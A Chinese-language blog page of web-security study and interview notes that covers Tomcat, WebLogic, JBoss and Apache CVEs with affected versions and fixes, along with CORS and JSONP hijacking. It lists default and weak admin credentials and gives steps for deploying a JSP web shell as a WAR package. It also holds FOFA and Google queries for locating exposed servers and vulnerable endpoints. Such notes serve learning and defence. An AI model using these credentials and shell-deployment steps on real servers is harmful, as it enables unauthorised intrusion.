<p><strong>漏洞原理</strong></p>
<p>当在Tomcat的conf（配置目录下）/web.xml配置文件中添加readonly设置为false时，将导致该漏洞产生，（需要允许put请求） , 攻击者可以利用PUT方法通过精心构造的数据包向存在漏洞的服务器里面上传 jsp一句话文件，从而造成远程命令执行，getshell等。</p>
<p><strong>影响范围</strong></p>
<p>Apache Tomcat 7.0.0 - 7.0.79</p>
<p>Apache Tomcat 8.5.19</p>
<p><strong>漏洞修复</strong></p>
<p>设置readonly 为 true</p>
<h3 id="后台弱口令部署war包"><a class="header-anchor" href="#后台弱口令部署war包">¶</a>后台弱口令部署war包</h3>
<p>在tomcat8环境下默认进入后台的密码为 tomcat/tomcat ，未修改造成未授权即可进入后台，或者管理员把密码设置成弱口令。</p>
<p>认密码:tomcat/tomcat</p>
<p>补充:</p>
<p>其他弱口令</p>
<p>admin:admin ADMIN:ADMIN admin:j5Brn9 admin:None admin:tomcat cxsdk:kdsxc j2deployer:j2deployer ovwebusr:OvW*busr1QCC:QLogic66 role:changethis role1:role1 role1:tomcat root:root tomcat:changethis tomcat:s3cret tomcat:tomcat tomcat:manager xampp:xampp</p>
<p>制作WAR包，将JSP木马压缩为ZIP格式，然后修改后缀为war就可以了。</p>
<h3 id="CVE-2020-1938Tomcat文件包含漏洞"><a class="header-anchor" href="#CVE-2020-1938Tomcat文件包含漏洞">¶</a>CVE-2020-1938Tomcat文件包含漏洞</h3>
<p><strong>漏洞原理</strong></p>
<p>由于Tomcat AJP协议设计上的缺陷，攻击者通过Tomcat AJP Connector 可以读取或包含Tomcat上所有</p>
<p>Webapp目录下的任意文件，例如：</p>
<p>可以读取webapp配置文件或源码文件。</p>
<p>此外如果目标应用有文件上传的功能情况下，配合为文件包含漏洞利用GetShell。</p>
<p><strong>影响版本</strong></p>
<p>Apache Tomcat 6</p>
<p>Tomcat 7系列 &lt;7.0.100 Tomcat 8系列 &lt; 8.5.51 Tomcat 9 系列 &lt;9.0.31</p>
<p><strong>漏洞修复</strong></p>
<ol>
<li>更新到最新版本</li>
<li>关闭AJP服务，修改Tomcat配置文件Service.xml,注释掉。</li>
</ol>
<Connector port="8009" protocol="AJP/1.3" redirectport="8443">
<ol>
<li>配置ajp配置中的secretRequired跟secret属性来限制认证。</li>
</ol>
<h2 id="WebLogic"><a class="header-anchor" href="#WebLogic">¶</a>WebLogic</h2>
<blockquote>
<p>Fofa:</p>
<p>“weblogic”</p>
<p>app=“Oracle-WebLogic-Server-管理控制台”</p>
<p>app=“BEA-WebLogic-Server” || app=“Weblogic_interface_7001”</p>
<p>“WebLogic” &amp;&amp; port=“7001”  &amp;&amp; title==“Error 404–Not Found”</p>
</blockquote>
<h3 id="Weblogic介绍"><a class="header-anchor" href="#Weblogic介绍">¶</a>Weblogic介绍</h3>
<p>​		WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间 件，默认端口：7001 WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
<h3 id="后台弱口令GetShell"><a class="header-anchor" href="#后台弱口令GetShell">¶</a>后台弱口令GetShell</h3>
<p>默认账号密码：weblogic/Oracle@123</p>
<p>上传war包，jsp木马压缩成zip，修改后缀为war，上传，访问部署好的war用蚁剑直接连接。</p>
<h3 id="CVE-2017-3506反序列化漏洞"><a class="header-anchor" href="#CVE-2017-3506反序列化漏洞">¶</a>CVE-2017-3506反序列化漏洞</h3>
<p><strong>漏洞描述</strong></p>
<p>Weblogic的WLS Security组件对外提供了webserver服务，其中使用了XMLDecoder来解析用户输入的 XML数据，在解析过程中出现反序列化漏洞，可导致任意命令执行。</p>
<p><strong>影响版本</strong></p>
<p>受影响版本：WebLogic 10.3.6.0, 12.1.3.0, 12.2.1.1, 12.2.1.2。</p>
<p>访问以下目录中的一种，有回显如下图可以判断wls-wsat组件存在</p>
<p>/wls-wsat/CoordinatorPortType</p>
<p>/wls-wsat/RegistrationPortTypeRPC</p>
<p>/wls-wsat/ParticipantPortType</p>
<p>/wls-wsat/RegistrationRequesterPortType</p>
<p>/wls-wsat/CoordinatorPortType11</p>
<p>/wls-wsat/RegistrationPortTypeRPC11</p>
<p>/wls-wsat/ParticipantPortType11</p>
<p>/wls-wsat/RegistrationRequesterPortType11</p>
<p><strong>漏洞修复</strong></p>
<p>更新到最新版本，打上10271的补丁,对访问wls-wsat的资源进行访问控制 ，或者根据业务所有需求，考虑是否删除WLS-WebServices组件。包含此组件路径为：</p>
<p>○ Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_interna  l/wls-wsat</p>
<p>○ Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/w  ls-wsat.war</p>
<ul>
<li>Middleware/wlserver_10.3/server/lib/wls-wsat.war</li>
</ul>
<p>以上路径都在WebLogic安装处。删除以上文件之后，需重启WebLogic。确认http://weblogic_ip/wls-  w sat/ 是否为404页面。</p>
<h3 id="CVE-2019-2725"><a class="header-anchor" href="#CVE-2019-2725">¶</a>CVE-2019-2725</h3>
<p><strong>漏洞描述</strong></p>
<p>wls9-async等组件为WebLogic Server提供异步通讯服务，默认应用于WebLogic部分版本。由于该WAR包在反序列化处理输入信息时存在缺陷，攻击者通过发送精心构造的恶意 HTTP 请求，即可获得目标服务器的权限，在未授权的情况下远程执行命令。</p>
<p><strong>影响版本</strong></p>
<p>weblogic 10.x weblogic 12.1.3</p>
<p><strong>漏洞修复</strong></p>
<ol>
<li>禁用bea_wls9_async_response组件；</li>
<li>删除wls9_async_response的war包并重启  ；</li>
<li>禁止访问 /_async/* 路径。</li>
</ol>
<h3 id="CVE-2018-2628"><a class="header-anchor" href="#CVE-2018-2628">¶</a>CVE-2018-2628</h3>
<p><strong>WebLogic T3协议反序列化命令执行漏洞(CVE-2018- 2628)</strong></p>
<p><strong>漏洞描述</strong></p>
<p>Weblogic Server中的RMI 通信使用T3协议在Weblogic Server和其它Java程序（客户端或者其它 Weblogic Server实例）之间传输数据, 服务器实例会跟踪连接到应用程序的每个Java虚拟机（JVM）中,并创建T3协议通信连接, 将流量传输到Java虚拟机. T3协议在开放WebLogic控制台端口的应用上默认开启， 攻击者可以通过T3协议发送恶意的的反序列化数据, 进行反序列化, 实现对存在漏洞的weblogic组件的远程代码执行攻击。</p>
<p><strong>漏洞影响</strong></p>
<p>Oracle WebLogic Server10.3.6.0.0 Oracle WebLogic Server12.1.3.0.0 Oracle WebLogic Server12.2.1.2.0 Oracle WebLogic Server12.2.1.3.0</p>
<p><strong>漏洞修复</strong></p>
<ol>
<li>及时更新补丁 ；</li>
<li>禁用T3协议 ；</li>
<li>禁止T3端口对外开放，或者限制可访问T3端口的IP来源。</li>
<li>升级版本</li>
</ol>
<h3 id="CVE-2018-2894WebLogic文件任意上传漏洞"><a class="header-anchor" href="#CVE-2018-2894WebLogic文件任意上传漏洞">¶</a>CVE-2018-2894WebLogic文件任意上传漏洞</h3>
<p><strong>漏洞描述</strong></p>
<p>Weblogic Web Service Test Page中一处任意文件上传漏洞，Web Service Test Page 在 “生产模式” 下默认不开启，所以该漏洞有一定限制。</p>
<p><strong>漏洞版本</strong></p>
<p>weblogic 10.3.6.0</p>
<p>weblogic 12.1.3.0</p>
<p>weblogic 12.2.1.2</p>
<p>weblogic 12.2.1.3</p>
<h3 id="CVE-2020-14882WebLogic远程代码执行漏洞"><a class="header-anchor" href="#CVE-2020-14882WebLogic远程代码执行漏洞">¶</a>CVE-2020-14882WebLogic远程代码执行漏洞</h3>
<p><strong>漏洞描述</strong></p>
<p>CVE-2020-14882  允许远程用户绕过管理员控制台组件中的身份验证。</p>
<p>CVE-2020-14883  允许经过身份验证的用户在管理员控制台组件上执行任何命令。</p>
<p>使用这两个漏洞链，未经身份验证的远程攻击者可以通过 HTTP 在 Oracle WebLogic 服务器上执行任意命令并完全控制主机</p>
<p><strong>影响版本</strong></p>
<p>Oracle Weblogic Server 10.3.6.0 Oracle Weblogic Server 12.1.3.0 Oracle Weblogic Server 12.2.1.3 Oracle Weblogic Server 12.2.1.4 Oracle Weblogic Server 14.1.1.0</p>
<h2 id="Jboss"><a class="header-anchor" href="#Jboss">¶</a>Jboss</h2>
<blockquote>
<p>Fofa:</p>
<p>title=“Welcome to JBoss AS” &amp;&amp; country!=“CN”</p>
</blockquote>
<h3 id="Jboss介绍"><a class="header-anchor" href="#Jboss介绍">¶</a>Jboss介绍</h3>
<p>JBoss是一个基于J2EE的开发源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。在J2EE应用服务器领域，JBoss是发展最为迅速的应用服务器。由于JBoss遵循商业友好的LGPL授权分发，并且由开源社区开发，这使得 JBoss广为流行。</p>
<h3 id="CVE-2015-7501-Jboss-JMXInvokerServlet-反序列化漏洞"><a class="header-anchor" href="#CVE-2015-7501-Jboss-JMXInvokerServlet-反序列化漏洞">¶</a>CVE-2015-7501 Jboss JMXInvokerServlet 反序列化漏洞</h3>
<p><strong>漏洞介绍</strong></p>
<p>这是经典的JBoss反序列化漏洞，JBoss在/invoker/JMXInvokerServlet请求中读取了用户传入的对象，然后我们利用Apache Commons Collections中的 Gadget 执行任意代码</p>
<p><strong>影响范围</strong></p>
<p>JBoss Enterprise Application Platform 6.4.4,5.2.0,4.3.0_CP10 JBoss AS (Wildly) 6 and earlier</p>
<p>JBoss A-MQ 6.2.0</p>
<p>JBoss Fuse 6.2.0</p>
<p>JBoss SOA Platform (SOA-P) 5.3.1 JBoss Data Grid (JDG) 6.5.0 JBoss BRMS (BRMS) 6.1.0</p>
<p>JBoss BPMS (BPMS) 6.1.0</p>
<p>JBoss Data Virtualization (JDV) 6.1.0 JBoss Fuse Service Works (FSW) 6.0.0 JBoss Enterprise Web Server (EWS) 2.1,3.0</p>
<h2 id="CVE-2017-7504-JBossMQ-JMS-反序列化漏洞"><a class="header-anchor" href="#CVE-2017-7504-JBossMQ-JMS-反序列化漏洞">¶</a>CVE-2017-7504 JBossMQ JMS 反序列化漏洞</h2>
<p><strong>影响范围</strong></p>
<p>JBoss 4.x 以及之前的所有版本</p>
<p><strong>漏洞介绍</strong></p>
<p>JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的 HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码执行</p>
<h3 id="CVE-2017-12149JBoss-5-x-6-x反序列化漏洞"><a class="header-anchor" href="#CVE-2017-12149JBoss-5-x-6-x反序列化漏洞">¶</a>CVE-2017-12149JBoss 5.x/6.x反序列化漏洞</h3>
<p><strong>漏洞简述</strong></p>
<p>该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞</p>
<p><strong>漏洞范围</strong></p>
<p>JBoss 5.x/6.x</p>
<h3 id="Administration-Console弱口令"><a class="header-anchor" href="#Administration-Console弱口令">¶</a>Administration Console弱口令</h3>
<p><strong>漏洞描述</strong></p>
<p>Administration Console管理页面存在弱口令，<code>admin:admin</code>，登陆后台上传war包 , getshell.</p>
<h3 id="低版本JMX-Console未授权"><a class="header-anchor" href="#低版本JMX-Console未授权">¶</a>低版本JMX Console未授权</h3>
<p>低版本JMX Console未授权访问Getshell</p>
<p><strong>漏洞描述</strong></p>
<p>此漏洞主要是由于 JBoss中/jmx-console/HtmlAdaptor 路径对外开放，并且没有任何身份验证机制，导致攻击者可以进⼊到 jmx控制台，并在其中执行任何功能。</p>
<h3 id="高版本JMX-Console未授权"><a class="header-anchor" href="#高版本JMX-Console未授权">¶</a>高版本JMX Console未授权</h3>
<p><strong>漏洞描述</strong></p>
<p>JMX Console默认存在未授权访问，直接点击JBoss主页中的 JMX Console 链接进入JMX Console页面, 通过部署war包 , getshell</p>
<p><strong>影响版本</strong></p>
<p>Jboss6.x以下</p>
<h2 id="Apache"><a class="header-anchor" href="#Apache">¶</a>Apache</h2>
<h3 id="CVE-2021-41773-Apache-HTTP-Server-路径穿越漏洞"><a class="header-anchor" href="#CVE-2021-41773-Apache-HTTP-Server-路径穿越漏洞">¶</a>CVE-2021-41773  Apache HTTP Server 路径穿越漏洞</h3>
<p><strong>漏洞简介</strong></p>
<p>该漏洞是由于Apache HTTP Server 2.4.49版本存在目录穿越漏洞,在路径穿越目录 &lt;Directory</p>
<p>允许被访问的的情况下（默认开启），攻击者可利用该路径穿</p>
<p>/&gt;Require all granted</p>
<p>越漏洞读取到Web目录之外的其他文件</p>
<p>在服务端开启了gi或cgid这两个mod的情况下，这个路径穿越漏洞将可以执行任意cgi命令（RCE）</p>
<p><strong>影响版本</strong></p>
<p>Apache HTTP Server 2.4.49</p>
<p>某些Apache HTTPd 2.4.50也存在此漏洞</p>
<h2 id="问题：-v2"><a class="header-anchor" href="#问题：-v2">¶</a>问题：</h2>
<p><strong>如何判断一个网站是Tomcat/Weblogic/Jboss框架？</strong></p>
<p>tomcat：</p>
<ol>
<li>默认端口 8080</li>
<li>浏览器的指纹识别插件</li>
<li>默认管理路由 /manage/html 4.server头 Apache Tomcat</li>
</ol>
<p>weblogic：</p>
<ol>
<li>浏览器插件</li>
<li>报错页面 Error 404–Not Found</li>
<li>默认管理页面路由 /console/login/LoginForm.jsp</li>
<li>7001端口</li>
</ol>
<p>Jboss：</p>
<ol>
<li>8080</li>
<li>浏览器识别插件</li>
<li>固定路由</li>
</ol>
<p>​		/admin-console/</p>
<p>​		/jmx-console/</p>
<ol start="4">
<li>title :Welcome to JBoss AS</li>
</ol>
<h1>Jsonp&amp;Cors</h1>
<h2 id="同源策略-v2"><a class="header-anchor" href="#同源策略-v2">¶</a>同源策略</h2>
<p><strong>SOP</strong>，全称为同源策略 (Same Origin Policy)，同源是指&quot;协议+域名+端口&quot;三者相同，即便两个不同的域名指向同一个 ip 地址，也非同源。</p>
<p>当一个请求url的<strong>协议、域名、端口</strong>三者之间任意一个与当前页面url不同即为<strong>跨域</strong></p>
<blockquote>
<p>如果没有同源策略，那么，你打开了一个合法网站，又打开了一个恶意网站。那么恶意网站的脚本能够随意的操作合法网站的任何可操作资源，没有任何限制。</p>
<p>浏览器要严格隔离两个不同源的网站，目的是保证数据的<strong>完整性和机密性。</strong></p>
</blockquote>
<p><strong>ps:下面这些标签跨域加载资源(资源类型是有限止的)是不受同源策略限制的</strong></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br>&lt;script src=<span class="hljs-string">&quot;...&quot;</span>&gt;	<span class="hljs-regexp">//</span>加载本地js执行<br><br>&lt;img src=<span class="hljs-string">&quot;...&quot;</span>&gt;	<span class="hljs-regexp">//</span>图片<br><br>&lt;link href=<span class="hljs-string">&quot;...&quot;</span>&gt;	<span class="hljs-regexp">//</span>css<br><br>&lt;iframe src=<span class="hljs-string">&quot;...&quot;</span>&gt; <span class="hljs-regexp">//</span>任意资源<br></code></pre></td></tr></table></figure>
<h2 id="CORS-v2"><a class="header-anchor" href="#CORS-v2">¶</a>CORS</h2>
<p>CORS（Cross-Origin Resource Sharing）<strong>跨域资源共享</strong>，其思想是使用自定义的HTTP头部让浏览器与服务器进行沟通，它允许浏览器向跨域服务器发出XMLHttpRequest请求，从而克服AX只能同源使用的 限制。</p>
<p>CORS的基本原理是：第三方网站生成访问控制策略，指定用户浏览器放宽SOP的限制，实现与指定的目标网站共享数据。</p>
<h3 id="CORS跨域漏洞"><a class="header-anchor" href="#CORS跨域漏洞">¶</a>CORS跨域漏洞</h3>
<p>介绍：因为同源策略的存在，不同源的客户端脚本不能访问目标站点的资源，如果目标站点CORS配置不当，没有对请求源的域做严格限制，导致任意源都可以访问时，就存在cors跨域漏洞问题。</p>
<p>原理：攻击者可以利用Web应用对用户请求数据包的Origin头校验不严格，诱骗受害者访问攻击者制作好的恶意网站，从而跨域获取受害者的敏感数据.</p>
<p><strong>本质</strong>是服务器配置不当</p>
<p>即<strong>Access-Control-Allow-Origin</strong>取自请求头Orgin字段，<strong>Access-Contorl-Allow-Credentials</strong>设置为true。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">GET / HTTP/<span class="hljs-number">1.1</span><br>HOST:<span class="hljs-built_in">exp</span>.<span class="hljs-keyword">com</span> Origin:www.<span class="hljs-built_in">exp</span>.<span class="hljs-keyword">com</span><br><span class="hljs-number">200</span> HTTP/<span class="hljs-number">1.1</span> OK<br>Access-Control-Allow-Origin:www.<span class="hljs-built_in">exp</span>.<span class="hljs-keyword">com</span> Access-Contorl-Allow-Credential<span class="hljs-variable">s:true</span><br></code></pre></td></tr></table></figure>
<p>导致攻击者可以构造恶意的脚本，诱导用户点击获取用户敏感数据。</p>
<p>如果返回以下，可认为不存在漏洞，因为CORS安全机制阻止了这种情况下的漏洞利用。</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">Access</span>-Control-Allow-Origin: *<br><br><span class="hljs-keyword">Access</span>-Control-Allow-Credentials: <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure>
<p><strong>Access-Control-Allow-Origin</strong>：指定哪些外域可以访问本域资源；</p>
<p><strong>Access-Control-Allow-Credentials</strong>：指定浏览器是否将使用请求发送Cookie。仅当设置为true</p>
<p>时，才会发送Cookie；默认是false</p>
<p><strong>Access-Control-Allow-Headers</strong>：指定可以在请求报文中添加的HTTP头字段； Access-Control-Max-Age：指定超时时间；</p>
<h3 id="CORS漏洞危害"><a class="header-anchor" href="#CORS漏洞危害">¶</a>CORS漏洞危害</h3>
<p>攻击者构造恶意的html页面，利用链接诱导受害者进行点击，从而获取受害者的敏感信息。</p>
<h3 id="CORS挖掘思路-v2"><a class="header-anchor" href="#CORS挖掘思路-v2">¶</a>CORS挖掘思路</h3>
<p>CORS的漏洞主要看当我们发起的请求中带有Origin 头部字段时，服务器的返回包带有CORS的相关字段并且允许Origin 的域访问。</p>
<h2 id="JSONP-v2"><a class="header-anchor" href="#JSONP-v2">¶</a>JSONP</h2>
<p>JSONP是JSON with   padding（填充式JSON或参数式JSON）的简写，是基于JSON格式达的为解决跨域请求资源而产生的解决方案。他实现的基本原理是利用的script标签的src属性不受同源策略影响的特   性，来跨越获取数据。</p>
<p>简单来说：可以让网页从别的域名（网站）那获取资料，即跨域读取数据。</p>
<p>JSONP由两部分组成： <strong>回调函数</strong> 、 <strong>数据</strong></p>
<p>**回调函数 **是当响应来时，在页面中调用的函数。回调函数的名称一般是在请求中指定的。而数据就是传入回调函数中的JSON数据。</p>
<h3 id="JSONP劫持漏洞-v2"><a class="header-anchor" href="#JSONP劫持漏洞-v2">¶</a>JSONP劫持漏洞</h3>
<p>JSON劫持又称 “JSON Hijacking” 。当网站通过JSONP的方式来跨域传递用户认证后的敏感信息时，<strong>如果服务端对JSONP的请求来源校验不严格，那么攻击者可以构造恶意的JSONP调用页面，诱导被攻击者访问达到截取用户敏感信息的目的</strong>。</p>
<p><strong>产生漏洞的原因</strong>：    网站没有对JSONP请求来源进行校验和过滤导致任意域都能够获取数据。</p>
<p>利用过程：寻找敏感 json 数据 api 接口，构造恶意的代码。 发送给用户，用户访问有恶意的页面，数据会被劫持发送到远程服务器。</p>
<img src="/posts/d62edc36/1690266827967-c7f3cd69-031d-4069-9917-2d915dc64930-1693987765629-1.jpeg" class title="img">
<h3 id="JSONP的危害"><a class="header-anchor" href="#JSONP的危害">¶</a>JSONP的危害</h3>
<p>攻击者构造恶意的html页面，利用链接诱导受害者进行点击，从而获取到受害者的敏感信息</p>
<h3 id="JSONP漏洞挖掘思路-v2"><a class="header-anchor" href="#JSONP漏洞挖掘思路-v2">¶</a>JSONP漏洞挖掘思路</h3>
<p>Google Hack语法</p>
<p>inurl:json inurl:callback= site:a.com inurl:json</p>
<p>Burp插件推荐</p>
<p><a target="_blank" rel="noopener" href="https://github.com/p1g3/JSONP-Hunter">https://github.com/p1g3/JSONP-Hunter</a></p>
<h3 id="防御方案-v2"><a class="header-anchor" href="#防御方案-v2">¶</a>防御方案</h3>
<ol>
<li>
<p>json 正确的 http 头输出尽量避免跨域的数据传输，对于同域的数据传输使用 xmlhttp 的方式作为数 据获取的方式，依赖于 javascript 在浏览器域里的安全性保护数据，如果是跨域的数据传输，必须要对敏 感的数据获取做权限认证；</p>
</li>
<li>
<p>严格安全的实现 CSRF 方式调用 JSON 文件：限制 Referer 、部署一次性 Token 等；</p>
</li>
<li>
<p>严格安装 JSON 格式标准输出 Content-Type 及编码（ Content-Type : application/json; charset=utf-8 ）</p>
</li>
<li>
<p>严格过滤 callback 函数名及 JSON 里数据的输出；</p>
</li>
<li>
<p>严格限制对 JSONP 输出 callback 函数名的长度(如防御上面 flash 输出的方法)；</p>
</li>
</ol>
</Connector>
                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E7%90%86%E8%AE%BA%E7%9F%A5%E8%AF%86/" class="category-chain-item">理论知识</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Web%E5%AE%89%E5%85%A8/">#Web安全</a>
      
        <a href="/tags/%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/">#面试总结</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Web安全学习总结</div>
      <div>https://jsweetcoffee.github.io/posts/d62edc36.html</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>SCxiaoyun</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年7月14日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/posts/bf2d52cc.html" title="新电脑安装所需装备">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">新电脑安装所需装备</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/posts/b7d90640.html" title="用友时空KSOA ImageUpload任意文件上传漏洞复现">
                        <span class="hidden-mobile">用友时空KSOA ImageUpload任意文件上传漏洞复现</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments">
      
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"ejWQ4cLgEdFyaqpxh7H74jUL-gzGzoHsz","appKey":"esK2EV3cfDXbDYkhTkNEHyHD","path":"window.location.pathname","placeholder":"吐槽一下","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":true,"verify":false,"notify":false},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        总访问量 
        <span id="busuanzi_value_site_pv"></span>
         次
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        总访客数 
        <span id="busuanzi_value_site_uv"></span>
         人
      </span>
    
    
  
</div>

  
  
  

  
  <script
  async
  defer
  src="http://49.233.251.176:10087/api/application/embed?protocol=http&host=49.233.251.176:10087&token=0c8a92daa216c5bf">
  </script>
</div>  

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":true,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>







  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
